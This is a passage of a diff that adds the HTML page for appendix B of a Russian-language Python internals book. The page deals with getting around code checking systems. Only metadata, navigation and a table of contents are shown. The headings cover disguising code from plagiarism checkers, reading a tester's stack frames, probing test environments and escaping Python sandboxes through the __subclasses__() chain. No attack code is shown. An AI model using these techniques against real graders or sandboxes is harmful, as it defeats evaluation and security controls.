@@ -1,0 +1,2129 @@
+<!--
+  Material for MkDocs — main.html override
+  Adds Open Graph / Twitter Card meta + JSON-LD structured data on every page.
+  Inherited from the base material theme; only the `htmltitle` and `extrahead`
+  blocks are customized.
+-->
+
+<!doctype html>
+<html lang="ru" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="От синтаксических трюков до internals CPython. Книга о редко используемых, скрытых и продвинутых возможностях Python.">
+      
+      
+        <meta name="author" content="@n3xumc0r3">
+      
+      
+        <link rel="canonical" href="https://n3xumc0r3.github.io/appendix-b-code-checkers/">
+      
+      
+        <link rel="prev" href="../appendix-a-plagiarism/">
+      
+      
+        <link rel="next" href="../appendix-c-code-golf/">
+      
+      
+      <link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Ctext%20y%3D%2218%22%20font-size%3D%2218%22%3E%F0%9F%90%8D%3C/text%3E%3C/svg%3E">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.49">
+    
+    
+      
+        <title>B. Взаимодействие с системами проверки кода - Python под капотом</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.6f8fc17f.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans:300,300i,400,400i,700,700i%7CIBM+Plex+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"IBM Plex Sans";--md-code-font:"IBM Plex Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  
+
+  
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="Python под капотом">
+  <meta property="og:title" content="B. Взаимодействие с системами проверки кода — Python под капотом">
+  <meta property="og:description" content="От синтаксических трюков до internals CPython. Книга о редко используемых, скрытых и продвинутых возможностях Python.">
+  <meta property="og:url" content="https://n3xumc0r3.github.io/appendix-b-code-checkers/">
+  <meta property="og:locale" content="ru_RU">
+  <meta property="og:image" content="https://n3xumc0r3.github.io/assets/cover.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="B. Взаимодействие с системами проверки кода — Python под капотом">
+  <meta name="twitter:description" content="От синтаксических трюков до internals CPython. Книга о редко используемых, скрытых и продвинутых возможностях Python.">
+  <meta name="twitter:image" content="https://n3xumc0r3.github.io/assets/cover.png">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Book",
+    "name": "Python под капотом",
+    "alternateName": "Python Under the Hood",
+    "description": "От синтаксических трюков до internals CPython. Книга о редко используемых, скрытых и продвинутых возможностях Python и интерпретатора CPython.",
+    "inLanguage": "ru",
+    "url": "https://n3xumc0r3.github.io/",
+    "author": {
+      "@type": "Person",
+      "name": "n3xumc0r3",
+      "url": "https://github.com/n3xumc0r3"
+    },
+    "license": "https://creativecommons.org/licenses/by-nc-sa/4.0/",
+    "publisher": {
+      "@type": "Organization",
+      "name": "py-underhood",
+      "url": "https://github.com/n3xumc0r3/py-underhood"
+    },
+    "about": [
+      {"@type": "Thing", "name": "Python (programming language)"},
+      {"@type": "Thing", "name": "CPython internals"},
+      {"@type": "Thing", "name": "Metaprogramming"},
+      {"@type": "Thing", "name": "Asynchronous programming"}
+    ]
+  }
+  </script>
+
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="green">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#b" class="md-skip">
+          Перейти к содержанию
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Верхний колонтитул">
+    <a href=".." title="Python под капотом" class="md-header__button md-logo" aria-label="Python под капотом" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Python под капотом
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              B. Взаимодействие с системами проверки кода
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="green"  aria-label="Тёмная тема"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Тёмная тема" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="light-green"  aria-label="Светлая тема"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Светлая тема" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Поиск" placeholder="Поиск" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Поиск">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Очистить" aria-label="Очистить" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Инициализация поиска
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/n3xumc0r3/py-underhood" title="Перейти к репозиторию" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    n3xumc0r3/py-underhood
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Навигация" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Python под капотом" class="md-nav__button md-logo" aria-label="Python под капотом" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Python под капотом
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/n3xumc0r3/py-underhood" title="Перейти к репозиторию" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    n3xumc0r3/py-underhood
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Главная
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../01-basics/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Часть I. Базовые скрытые особенности
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../02-context-managers/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Часть II. Контекстные менеджеры
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../03-generators/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Часть III. Генераторы и итераторы
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../04-async/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Часть IV. Асинхронность
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../05-classes/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Часть V. Классы и интерфейсы
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../06-descriptors/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Часть VI. Дескрипторы и property
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../07-metaprogramming/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Часть VII. Метапрограммирование
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../08-cpython-internals/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Часть VIII. Внутренности CPython
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../09-encodings/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Часть IX. Кодировки и кодеки
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../10-introspection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Часть X. Интроспекция окружения
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../11-stdlib/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Часть XI. Полезные модули stdlib
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../12-linters/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Часть XII. Линтеры и директивы
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_14" id="__nav_14_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Приложения
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_14_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_14">
+            <span class="md-nav__icon md-icon"></span>
+            Приложения
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../appendix-a-plagiarism/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    A. Системы обнаружения плагиата
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    B. Взаимодействие с системами проверки кода
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    B. Взаимодействие с системами проверки кода
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Содержание">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#b1" class="md-nav__link">
+    <span class="md-ellipsis">
+      B.1. Косметические приёмы — обман на уровне токенов
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="B.1. Косметические приёмы — обман на уровне токенов">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pereimenovanie" class="md-nav__link">
+    <span class="md-ellipsis">
+      Переименование идентификаторов
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#inlining" class="md-nav__link">
+    <span class="md-ellipsis">
+      Inlining / outlining
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#izmenenie" class="md-nav__link">
+    <span class="md-ellipsis">
+      Изменение управляющих конструкций
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zamena" class="md-nav__link">
+    <span class="md-ellipsis">
+      Замена типов данных
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mertvyy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Мёртвый код (dead code insertion)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zamena" class="md-nav__link">
+    <span class="md-ellipsis">
+      Замена библиотек
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#arifmeticheskie" class="md-nav__link">
+    <span class="md-ellipsis">
+      Арифметические эквиваленты
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#b2" class="md-nav__link">
+    <span class="md-ellipsis">
+      B.2. Архитектурные приёмы — перенос логики в рантайм
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="B.2. Архитектурные приёмы — перенос логики в рантайм">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#annotatsii" class="md-nav__link">
+    <span class="md-ellipsis">
+      Аннотации как данные
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#setattr" class="md-nav__link">
+    <span class="md-ellipsis">
+      setattr для динамических атрибутов
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#compile" class="md-nav__link">
+    <span class="md-ellipsis">
+      compile + exec — код из строки
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#typesfunctiontype" class="md-nav__link">
+    <span class="md-ellipsis">
+      types.FunctionType + types.CodeType — сборка функции из байт-кода
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#type" class="md-nav__link">
+    <span class="md-ellipsis">
+      type() — динамическое создание классов
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kombinirovannyy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Комбинированный коктейль
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#b3-ctypes" class="md-nav__link">
+    <span class="md-ellipsis">
+      B.3. Перехват аргументов через фреймы и ctypes
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="B.3. Перехват аргументов через фреймы и ctypes">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sysgetframe" class="md-nav__link">
+    <span class="md-ellipsis">
+      sys._getframe — чтение локальных переменных вызывающего
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ctypespythonapipyframelocalstofast" class="md-nav__link">
+    <span class="md-ellipsis">
+      ctypes.pythonapi.PyFrame_LocalsToFast — запись изменений обратно
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#podmena" class="md-nav__link">
+    <span class="md-ellipsis">
+      Подмена co_name / co_filename
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#chtenie" class="md-nav__link">
+    <span class="md-ellipsis">
+      Чтение данных из фрейма тестирующего
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#b4" class="md-nav__link">
+    <span class="md-ellipsis">
+      B.4. Интроспекция окружения тестирующих систем
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="B.4. Интроспекция окружения тестирующих систем">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#universalnyy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Универсальный «комбайн» — собрать всё в JSON
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#konkretnye" class="md-nav__link">
+    <span class="md-ellipsis">
+      Конкретные проверки
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zaschita" class="md-nav__link">
+    <span class="md-ellipsis">
+      Защита тестирующих систем
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#b5-__subclasses__" class="md-nav__link">
+    <span class="md-ellipsis">
+      B.5. Песочницы и обход через __subclasses__()
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="B.5. Песочницы и обход через __subclasses__()">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tsepochka" class="md-nav__link">
+    <span class="md-ellipsis">
+      Цепочка: ().__class__.__base__.__subclasses__()
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#poisk" class="md-nav__link">
+    <span class="md-ellipsis">
+      Поиск класса с доступом к os
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#universalnyy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Универсальный «finder» — найти любой модуль в __subclasses__
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#alternativnye" class="md-nav__link">
+    <span class="md-ellipsis">
+      Альтернативные пути обхода
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zaschita" class="md-nav__link">
+    <span class="md-ellipsis">
+      Защита: почему это сложно заблокировать
+    </span>
+  </a>
+  
+</li>
+        
